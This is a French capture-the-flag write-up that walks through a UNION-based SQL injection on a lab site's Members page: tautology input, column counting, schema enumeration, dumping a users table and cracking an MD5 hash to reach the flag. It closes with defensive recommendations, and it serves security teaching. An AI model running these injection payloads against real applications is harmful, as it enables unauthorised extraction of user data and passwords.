# SQL Injection Members

## Description

La faille SQL Injection sur la page Members est une injection SQL qui fait partie des vulnérabilités les plus critiques en sécurité web.
Elle se produit quand une application injecte directement l’entrée utilisateur dans une requête SQL sans la sécuriser.

## Comment reproduire la faille

1. Aller sur la page Members ou `?page=member`

2. Dans le champ pour rechercher un utilisateur par son ID, on rentre une condition logique toujours vraie qui force la requête à retourner toutes les lignes de la table :
     ```
    1 OR 1=1
     ```

- Un des utilisateurs retourné s'appelle "Flag GetThe", ce qui semble confirmé la faille.

3. Pour identifier le nombre de colonnes et ainsi préparer l'extraction des données :
     ```
    1 UNION SELECT null, null
     ```
Puisqu’il n’y a pas d’erreur, cela signifie que la requête initiale contient 2 colonnes.

4. Pour identifier le nom de la base de données :
     ```
    1 UNION SELECT database(), null
     ```

- Le nom de la database trouvé, Member_Sql_Injection, confirme le type de vulnerabilité trouvée

5. Pour identifier toutes les tables et colonnes :
     ```
    1 UNION SELECT table_name, column_name FROM information_schema.columns
     ```
On découvre dans la table `users` les colonnes `countersign` contenant les mots de passe hashés et `Commentaire`

6. Pour récupérer les données sensibles :
     ```
    1 UNION SELECT Commentaire, countersign FROM users
     ```
Le dernier user contient ce message explicatif : 
     ```
    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
    Surname : 5ff9d0165b4f92b14994e5c685cdce28
     ```

7. Le surname est transformé avec d'abord le décryptage du hash MD5 avec un outil en ligne type CrackStation, on trouve FortyTwo, on met tout en minuscule et on applique un SHA256 hashing dessus :
     ```
    echo -n "fortytwo" | shasum -a 256
     ```

- On obtient le flag final : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Recommandations pour empêcher la faille

* Valider et filtrer les entrées utilisateur :
    * Vérifier le type (ex : entier pour un ID)
    * Bloquer les caractères inattendus
    * Refuser les entrées vides ou invalides

* Ne pas afficher les erreurs SQL aux utilisateurs

* Utiliser un hash sécurisé pour les mots de passe type bcrypt ou Argon2

* Limiter les privilèges du compte base de données :
    * Pas d’accès à information_schema

* Utiliser un WAF :
    * Configurer un pare-feu applicatif pour bloquer les patterns SQL suspects.

## Conclusion

Cette faille SQL Injection sur la page Members peut mener à une fuite de données, un contournement d’authentification, ou encore à la destruction de données. C’est une vulnérabilité critique, très connue et très dangereuse. En appliquant une validation et un filtrage stricte des entrées ou encore une limitation des privilèges, il est possible de se prémunir efficacement contre ce type de vulnérabilité.